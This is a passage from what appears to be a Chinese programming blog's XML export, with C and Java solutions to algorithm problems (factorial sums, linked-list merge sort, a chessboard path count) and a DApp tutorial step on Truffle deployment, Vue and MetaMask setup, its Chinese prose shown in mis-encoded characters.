class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>;; i++) &#123;</span><br><span class="line">        sum = (ans[i] + num[index].factorial[i] + c) % MAX_NUM;</span><br><span class="line">        c = (ans[i] + num[index].factorial[i] + c) / MAX_NUM;</span><br><span class="line">        ans[i] = sum;</span><br><span class="line">        <span class="keyword">if</span> ((sum + c + ans[i + <span class="number">1</span>]) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, i, len;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        setNum(i);</span><br><span class="line">        len = addAns(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = len - <span class="number">1</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="comment">// é¦–ä½å‰å¯¼é›¶å»æ‰</span></span><br><span class="line">        <span class="keyword">if</span> (ans[i] &lt; <span class="number">10</span> &amp;&amp; i != len - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"0%d"</span>, ans[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ä¸ªä½æ•°è¡¥é›¶</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>é˜¶ä¹˜</tag>
        <tag>é«˜ç²¾åº¦</tag>
      </tags>
  </entry>
  <entry>
    <title>éé€’å½’æ–¹å¼è¿›è¡Œå½’å¹¶æ’åºé“¾è¡¨</title>
    <url>/2020/08/24/%E9%9D%9E%E9%80%92%E5%BD%92%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<blockquote>
<p>é¢˜ç›®æ¥æºï¼š<a href="https://leetcode-cn.com/problems/sort-list/" target="_blank" rel="noopener">LeetCode 148</a></p>
</blockquote>
<h2 id="é¢˜ç›®å¤§æ„"><a href="#é¢˜ç›®å¤§æ„" class="headerlink" title="é¢˜ç›®å¤§æ„"></a>é¢˜ç›®å¤§æ„</h2><p>ç»™ä½ ä¸€ä¸ªé“¾è¡¨ï¼Œ åœ¨ <code>O(n log n)</code>æ—¶é—´å¤æ‚åº¦å’Œå¸¸æ•°çº§ç©ºé—´å¤æ‚åº¦ä¸‹ï¼Œå¯¹é“¾è¡¨è¿›è¡Œæ’åºã€‚ </p>
<p>å•¥ï¼ŸæŠŠé“¾è¡¨æ’åºï¼ŒæŠŠæ—¶é—´å¤æ‚åº¦æ§åˆ¶åœ¨<code>O(nlogn)</code>ï¼Ÿï¼Œé“¾è¡¨ä¸åƒæ•°ç»„ï¼Œæ’åºæ²¡æœ‰é‚£ä¹ˆæ–¹ä¾¿å•Šï¼å½’å¹¶æ’åºï¼Œå¸¸æ•°çº§ç©ºé—´å¤æ‚åº¦ï¼Ÿé‚£åªèƒ½éé€’å½’å®ç°äº†~~</p>
<p>ä¸è¿‡æˆ‘ä¸çŸ¥é“è¯¥æ€ä¹ˆå†™ï¼Œçœ‹äº†è¯„è®ºåŒºï¼Œè‡ªå·±æ•´ç†äº†ä¸€ä¸‹ã€‚<a id="more"></a></p>
<h2 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode <span class="title">mergetSort</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    <span class="keyword">int</span> listLength = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (ListNode l = head; l != <span class="keyword">null</span>; l = l.next) listLength++;</span><br><span class="line">    ListNode helperRoot = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    helperRoot.next = head;</span><br><span class="line">    ListNode helper = helperRoot;</span><br><span class="line">    <span class="comment">// æ­¥é•¿ï¼Œ å³æ¯ä¸ªå­åŒºé—´çš„é•¿åº¦</span></span><br><span class="line">    <span class="keyword">int</span> step = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (step &lt; listLength) &#123;</span><br><span class="line">        helper = helperRoot;</span><br><span class="line">        <span class="keyword">for</span> (ListNode start = helperRoot.next; start != <span class="keyword">null</span>; ) &#123;</span><br><span class="line">            ListNode end = start, mid = start, pre = start;</span><br><span class="line">            <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (len &lt; step &amp;&amp; mid != <span class="keyword">null</span>) &#123;</span><br><span class="line">                len++;</span><br><span class="line">                pre = mid;</span><br><span class="line">                mid = mid.next;</span><br><span class="line">            &#125;</span><br><span class="line">            pre.next = <span class="keyword">null</span>;</span><br><span class="line">            end = mid;</span><br><span class="line">            pre = mid;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (len &lt; step &amp;&amp; end != <span class="keyword">null</span>) &#123;</span><br><span class="line">                len++;</span><br><span class="line">                pre = end;</span><br><span class="line">                end = end.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pre != <span class="keyword">null</span>) pre.next = <span class="keyword">null</span>;</span><br><span class="line">            ListNode nextStart = end;</span><br><span class="line">            ListNode[] merger = merger(start, mid);</span><br><span class="line">            helper.next = merger[<span class="number">0</span>];</span><br><span class="line">            merger[<span class="number">1</span>].next = nextStart;</span><br><span class="line">            start = nextStart;</span><br><span class="line">            helper = merger[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        step *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> helperRoot.next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿”å›åˆå¹¶åçš„é“¾è¡¨å¤´æŒ‡é’ˆå’Œå°¾æŒ‡é’ˆ</span></span><br><span class="line">ListNode[] merger(ListNode left, ListNode rightStart) &#123;</span><br><span class="line">    ListNode leftStart = left;</span><br><span class="line">    ListNode listTail = left;</span><br><span class="line">    <span class="keyword">if</span> (leftStart == <span class="keyword">null</span> &amp;&amp; rightStart == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// å…¶å®åœ¨æœ¬é¢˜ä¸­ï¼Œ å·¦è¾¹é“¾è¡¨ä¸ä¼šæ˜¯null</span></span><br><span class="line">    <span class="keyword">if</span> (leftStart == <span class="keyword">null</span>) &#123;</span><br><span class="line">        listTail = rightStart;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ListNode[]&#123;rightStart, listTail&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (rightStart == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ListNode[]&#123;left, listTail&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode root = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    ListNode tail = root;</span><br><span class="line">    <span class="keyword">while</span> (rightStart != <span class="keyword">null</span> &amp;&amp; leftStart != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (leftStart.val &lt; rightStart.val) &#123;</span><br><span class="line">            tail.next = leftStart;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            leftStart = leftStart.next;</span><br><span class="line">            tail.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tail.next = rightStart;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            rightStart = rightStart.next;</span><br><span class="line">            tail.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (leftStart == <span class="keyword">null</span>) &#123;</span><br><span class="line">        tail.next = rightStart;</span><br><span class="line">        listTail = tail;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tail.next = leftStart;</span><br><span class="line">        listTail = tail;</span><br><span class="line">        <span class="keyword">while</span> (listTail.next != <span class="keyword">null</span>) listTail = listTail.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ListNode[]&#123;root.next, listTail&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å½’å¹¶æ’åº</tag>
        <tag>é“¾è¡¨</tag>
      </tags>
  </entry>
  <entry>
    <title>é©¬æ‹¦è¿‡æ²³å’</title>
    <url>/2020/05/24/%E9%A9%AC%E5%85%B0%E8%BF%87%E6%B2%B3%E5%8D%92/</url>
    <content><![CDATA[<blockquote>
<p>é¢˜ç›®æ¥æºï¼š<a href="https://www.dotcpp.com/oj/problem1266.html" target="_blank" rel="noopener">Cè¯­è¨€ç½‘1266</a></p>
</blockquote>
<h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><p> æ£‹ç›˜ä¸ŠAç‚¹æœ‰ä¸€ä¸ªè¿‡æ²³å’ï¼Œéœ€è¦èµ°åˆ°ç›®æ ‡Bç‚¹ã€‚å’è¡Œèµ°çš„è§„åˆ™ï¼šå¯ä»¥å‘ä¸‹ã€æˆ–è€…å‘å³ã€‚åŒæ—¶åœ¨æ£‹ç›˜ä¸ŠCç‚¹æœ‰ä¸€ä¸ªå¯¹æ–¹çš„é©¬ï¼Œè¯¥é©¬æ‰€åœ¨çš„ç‚¹å’Œæ‰€æœ‰è·³è·ƒä¸€æ­¥å¯è¾¾çš„ç‚¹ç§°ä¸ºå¯¹æ–¹é©¬çš„æ§åˆ¶ç‚¹ã€‚å› æ­¤ç§°ä¹‹ä¸ºâ€œé©¬æ‹¦è¿‡æ²³å’â€ã€‚<br>æ£‹ç›˜ç”¨åæ ‡è¡¨ç¤ºï¼ŒAç‚¹(0, 0)ã€Bç‚¹(n, m)(n, mä¸ºä¸è¶…è¿‡15çš„æ•´æ•°)ï¼ŒåŒæ ·é©¬çš„ä½ç½®åæ ‡æ˜¯éœ€è¦ç»™å‡ºçš„ã€‚ç°åœ¨è¦æ±‚ä½ è®¡ç®—å‡ºå’ä»Aç‚¹èƒ½å¤Ÿåˆ°è¾¾Bç‚¹çš„è·¯å¾„çš„æ¡æ•°ï¼Œå‡è®¾é©¬çš„ä½ç½®æ˜¯å›ºå®šä¸åŠ¨çš„ï¼Œå¹¶ä¸æ˜¯å’èµ°ä¸€æ­¥é©¬èµ°ä¸€æ­¥ã€‚ <a id="more"></a></p>
<h3 id="è¾“å…¥"><a href="#è¾“å…¥" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p> ä¸€è¡Œå››ä¸ªæ•°æ®ï¼Œåˆ†åˆ«è¡¨ç¤ºBç‚¹åæ ‡å’Œé©¬çš„åæ ‡ã€‚ï¼ˆä¿è¯æ‰€æœ‰çš„æ•°æ®æœ‰è§£ï¼‰ </p>
<h3 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p> ä¸€ä¸ªæ•°æ®ï¼Œè¡¨ç¤ºæ‰€æœ‰çš„è·¯å¾„æ¡æ•°ã€‚ </p>
<h3 id="æ ·ä¾‹è¾“å…¥"><a href="#æ ·ä¾‹è¾“å…¥" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6 6 3 5</span><br></pre></td></tr></table></figure>

<h3 id="æ ·ä¾‹è¾“å‡º"><a href="#æ ·ä¾‹è¾“å‡º" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<h2 id="é—®é¢˜æ±‚è§£"><a href="#é—®é¢˜æ±‚è§£" class="headerlink" title="é—®é¢˜æ±‚è§£"></a>é—®é¢˜æ±‚è§£</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-24 13:34:01</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-24 14:16:01</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\dotcpp\1266.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @x : é©¬çš„æ¨ªåæ ‡  @y : é©¬çš„çºµåæ ‡</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> path[<span class="number">16</span>][<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;, sum = <span class="number">0</span>, n, m, x, y;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆå§‹åŒ–ç¦åŒº</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setHorse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    path[x][y] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">2</span>) &gt;= <span class="number">0</span> &amp;&amp; (y - <span class="number">1</span>) &gt;= <span class="number">0</span>) path[x - <span class="number">2</span>][y - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">1</span>) &gt;= <span class="number">0</span> &amp;&amp; (y - <span class="number">2</span>) &gt;= <span class="number">0</span>) path[x - <span class="number">1</span>][y - <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">2</span>) &gt;= <span class="number">0</span> &amp;&amp; (y + <span class="number">1</span>) &lt;= m) path[x - <span class="number">2</span>][y + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x - <span class="number">1</span>) &gt;= <span class="number">0</span> &amp;&amp; (y + <span class="number">2</span>) &lt;= m) path[x - <span class="number">1</span>][y + <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">2</span>) &lt;= n &amp;&amp; (y - <span class="number">1</span>) &gt;= <span class="number">0</span>) path[x + <span class="number">2</span>][y - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">1</span>) &lt;= n &amp;&amp; (y - <span class="number">2</span>) &gt;= <span class="number">0</span>) path[x + <span class="number">1</span>][y - <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">2</span>) &lt;= n &amp;&amp; (y + <span class="number">1</span>) &lt;= m) path[x + <span class="number">2</span>][y + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x + <span class="number">1</span>) &lt;= n &amp;&amp; (y + <span class="number">2</span>) &lt;= m) path[x + <span class="number">1</span>][y + <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findPath</span><span class="params">(<span class="keyword">int</span> nowX, <span class="keyword">int</span> nowY)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nowX == n &amp;&amp; nowY == m) &#123;</span><br><span class="line">        sum++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å…ˆå¾€å³</span></span><br><span class="line">    <span class="keyword">if</span> ((nowY + <span class="number">1</span>) &lt;= m &amp;&amp; !path[nowX][nowY + <span class="number">1</span>]) findPath(nowX, nowY + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// å†å¾€ä¸‹</span></span><br><span class="line">    <span class="keyword">if</span> ((nowX + <span class="number">1</span>) &lt;= n &amp;&amp; !path[nowX + <span class="number">1</span>][nowY]) findPath(nowX + <span class="number">1</span>, nowY);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d%d"</span>, &amp;n, &amp;m, &amp;x, &amp;y);</span><br><span class="line">    setHorse();</span><br><span class="line">    <span class="comment">// å…ˆå¾€å³</span></span><br><span class="line">    <span class="keyword">if</span> (!path[<span class="number">0</span>][<span class="number">1</span>]) findPath(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// å†å¾€ä¸‹</span></span><br><span class="line">    <span class="keyword">if</span> (!path[<span class="number">1</span>][<span class="number">0</span>]) findPath(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>é€’å½’</tag>
        <tag>æ·±åº¦ä¼˜å…ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>é“¾åš--DAPPç»ƒæ‰‹é¡¹ç›®ï¼ˆäºŒï¼‰</title>
    <url>/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>åŸæ–‡å†ç»­ï¼Œä¹¦æ¥ä¸Šå›ã€‚</p>
<p>è¿™ä¸€å›æˆ‘ä»¬ä¸»è¦åšå‰ç½®éƒ¨ç½²å·¥ä½œã€‚<a id="more"></a></p>
<h2 id="Ganacheé…ç½®"><a href="#Ganacheé…ç½®" class="headerlink" title="Ganacheé…ç½®"></a>Ganacheé…ç½®</h2><p>é¦–å…ˆæ‰“å¼€<code>Ganache</code>ï¼Œç„¶åæ–°å»ºä¸€ä¸ªå·¥ç¨‹<code>chain_blog_network</code>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™è¡¨æ˜æˆ‘ä»¬åœ¨æœ¬åœ°åˆ›å»ºå¥½äº†ä¸€ä¸ªæµ‹è¯•é“¾ï¼ˆå½“ç„¶å¦‚æœä½ æœ‰ä¸€äº›æµ‹è¯•ä»¥å¤ªå¸ï¼Œä½ å¯ä»¥éƒ¨ç½²åˆ°ç›¸åº”çš„æµ‹è¯•é“¾ä¸­ï¼‰ã€‚åœ¨è¿™ä¸ªæµ‹è¯•é“¾ä¸­ï¼Œæœ‰è‹¥å¹²ä¸ªè´¦æˆ·ï¼Œæ¯ä¸ªè´¦æˆ·éƒ½æœ‰100ä¸ªä»¥å¤ªå¸ï¼Œç‚¹å‡»æ¯ä¸ªè´¦æˆ·çš„é’¥åŒ™å›¾æ ‡å°±å¯ä»¥è·å–å…¶ç§é’¥ã€‚</p>
<p><img src="https://cdn.yalexin.top/ganache_01.png" alt></p>
<h2 id="ç¼–å†™éƒ¨ç½²è„šæœ¬"><a href="#ç¼–å†™éƒ¨ç½²è„šæœ¬" class="headerlink" title="ç¼–å†™éƒ¨ç½²è„šæœ¬"></a>ç¼–å†™éƒ¨ç½²è„šæœ¬</h2><p>ç¼–å†™æµ‹è¯•è„šæœ¬ä¹‹å‰ï¼Œè¯·å†æ¬¡ç¡®ä¿é…ç½®æ–‡ä»¶<code>truffle-config.js</code>å·²ç»è®¾ç½®å¥½:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">     host: <span class="string">"127.0.0.1"</span>,     <span class="comment">// Localhost (default: none)</span></span><br><span class="line">     port: <span class="number">7545</span>,            <span class="comment">// Standard Ethereum port (default: none)</span></span><br><span class="line">     network_id: <span class="string">"*"</span>,       <span class="comment">// Any network (default: none)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€åœ¨<code>migrations</code>æ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ªéƒ¨ç½²è„šæœ¬<code>1_deploy.js</code>ï¼Œè¯·æ³¨æ„ï¼Œæ–‡ä»¶åä»¥æ•°å­—ä¸ºå‰ç¼€ï¼Œåç¼€ä¸ºæè¿°ã€‚ ç¼–å·å‰ç¼€æ˜¯å¿…éœ€çš„ï¼Œä»¥ä¾¿è®°å½•è¿ç§»æ˜¯å¦æˆåŠŸè¿è¡Œã€‚ åç¼€çº¯ç²¹æ˜¯ä¸ºäº†äººç±»çš„å¯è¯»æ€§å’Œç†è§£åŠ›ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­å†™å…¥å¦‚ä¸‹æ–‡ä»¶ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ChainBlog = artifacts.require(<span class="string">"ChainBlog"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(ChainBlog);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œéƒ¨ç½²å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> truffle migrate</span></span><br></pre></td></tr></table></figure>

<p>å½“å‡ºç°ç›¸å…³ä¿¡æ¯åï¼Œåˆ™è¯´æ˜éƒ¨ç½²æˆåŠŸäº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Summary</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&gt; Total deployments:   1</span><br><span class="line">&gt; Final cost:          0.03190554 ETH</span><br></pre></td></tr></table></figure>

<h2 id="åˆå§‹åŒ–Vueé¡¹ç›®"><a href="#åˆå§‹åŒ–Vueé¡¹ç›®" class="headerlink" title="åˆå§‹åŒ–Vueé¡¹ç›®"></a>åˆå§‹åŒ–Vueé¡¹ç›®</h2><h3 id="Vue-å®‰è£…"><a href="#Vue-å®‰è£…" class="headerlink" title="Vue å®‰è£…"></a>Vue å®‰è£…</h3><p>ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£…</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g @vue/cli</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vue -V</span></span><br><span class="line">@vue/cli 5.0.8</span><br></pre></td></tr></table></figure>

<h3 id="åˆ›å»ºVueé¡¹ç›®"><a href="#åˆ›å»ºVueé¡¹ç›®" class="headerlink" title="åˆ›å»ºVueé¡¹ç›®"></a>åˆ›å»ºVueé¡¹ç›®</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vue create chain_blog</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åé€‰æ‹©<code>vue2</code>ç‰ˆæœ¬ï¼Œç„¶åå°†ä¸€äº›â€œæ’ä»¶â€è£…ä¸Šå³å¯ï¼Œä¾‹å¦‚<code>Babel</code>ã€<code>Router</code>ã€<code>CSS Pre-processors</code>ã€‚</p>
<p>åˆ›å»ºå®Œæ¯•åï¼Œè®°å¾—åœ¨é¡¹ç›®ä¸­å®‰è£…<code>web3</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install web3 --save</span></span><br></pre></td></tr></table></figure>

<h3 id="æ•´åˆ"><a href="#æ•´åˆ" class="headerlink" title="æ•´åˆ"></a>æ•´åˆ</h3><p>ä¸ºäº†æ–¹ä¾¿<code>Vue</code>é¡¹ç›®èƒ½å¤Ÿè¯»å–åˆ°åˆçº¦çš„<code>abi</code>ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬è¦å¯¹ä¹‹å‰ç”Ÿæˆçš„<code>truffle</code>é¡¹ç›®åšå‡ºç®€å•ä¿®æ”¹ã€‚</p>
<p>å°†ä¹‹å‰æ–‡ä»¶å¤¹<code>chainBlogContracts</code>ä¸‹æ‰€æœ‰çš„æ–‡ä»¶éƒ½å¤åˆ¶åˆ°å½“å‰æ–‡ä»¶å¤¹<code>chain_blog</code>ä¸‹ï¼Œå¹¶åœ¨<code>truffle-config.js</code>ä¸­è®¾ç½®æ„å»ºè·¯å¾„ï¼Œä½¿å¾—æˆ‘ä»¬çš„<code>vue</code>åº”ç”¨èƒ½å¤Ÿè·å–æ™ºèƒ½åˆçº¦ç›¸å…³çš„<code>ABI</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">  <span class="string">"contracts_build_directory"</span>: <span class="string">"./src/build"</span></span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç„¶åé‡æ–°è¿è¡Œéƒ¨ç½²å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> truffle migrate</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸å‡ºæ„å¤–ï¼Œé‚£æˆ‘ä»¬å°†ä¼šåœ¨<code>vue</code>é¡¹ç›®ä¸‹çš„<code>src</code>æ–‡ä»¶å¤¹ä¸‹<code>build</code>ç›®å½•ä¸­çœ‹åˆ°æˆ‘ä»¬çš„æ™ºèƒ½åˆçº¦<code>json</code>æ–‡ä»¶.</p>
<h2 id="MetaMask-å®‰è£…"><a href="#MetaMask-å®‰è£…" class="headerlink" title="MetaMask å®‰è£…"></a>MetaMask å®‰è£…</h2><p>æˆ‘ä»¬çš„é¡¹ç›®æ˜¯åŸºäºæ™ºèƒ½åˆçº¦ï¼Œåœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼Œæ¯æ¬¡å’Œå®ƒä»¬äº¤äº’ï¼Œéœ€è¦ä¸€ä¸ªè´¦æˆ·ã€‚</p>
<p>äº¤äº’è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ç›´æ¥æ‰‹åŠ¨åˆ›å»ºäº¤æ˜“ï¼Œç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç­¾åï¼Œç„¶åå¹¿æ’­æˆ‘ä»¬çš„äº¤æ˜“ï¼Œä»è€Œå®Œæˆæˆ‘ä»¬ä¸æ™ºèƒ½åˆçº¦äº¤äº’ã€‚</p>
<p>ç„¶åå¦‚æ­¤ä¸€æ¥ï¼Œå½“æˆ‘ä»¬æœ‰å¤šä¸ªè´¦æˆ·æ—¶å€™ï¼Œåˆ‡æ¢è´¦å·ä»¥åŠè´¦å·çš„ä¿ç®¡æ˜¯ä¸€ä¸ªéº»çƒ¦çš„äº‹æƒ…ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å€ŸåŠ©<code>MetaMask</code>å·¥å…·ï¼Œå°†æˆ‘ä»¬çš„è´¦æˆ·äº¤ç»™å…¶æŒç®¡ï¼Œè€Œä¸”ä¸ç”¨æ‹…å¿ƒè´¦æˆ·ä¼šè¢«ç¬¬ä¸‰æ–¹æœºæ„çªƒå–ï¼Œå› ä¸ºæœ€ç»ˆæˆ‘ä»¬çš„è´¦æˆ·ä¿¡æ¯æ˜¯ä¿å­˜åœ¨æœ¬åœ°çš„ã€‚</p>
<p>å¯ä»¥åˆ°<code>chrome</code>æµè§ˆå™¨æˆ–è€…<code>Edge</code>æµè§ˆå™¨çš„æ‰©å±•å•†åº—ä¸‹è½½ã€‚</p>
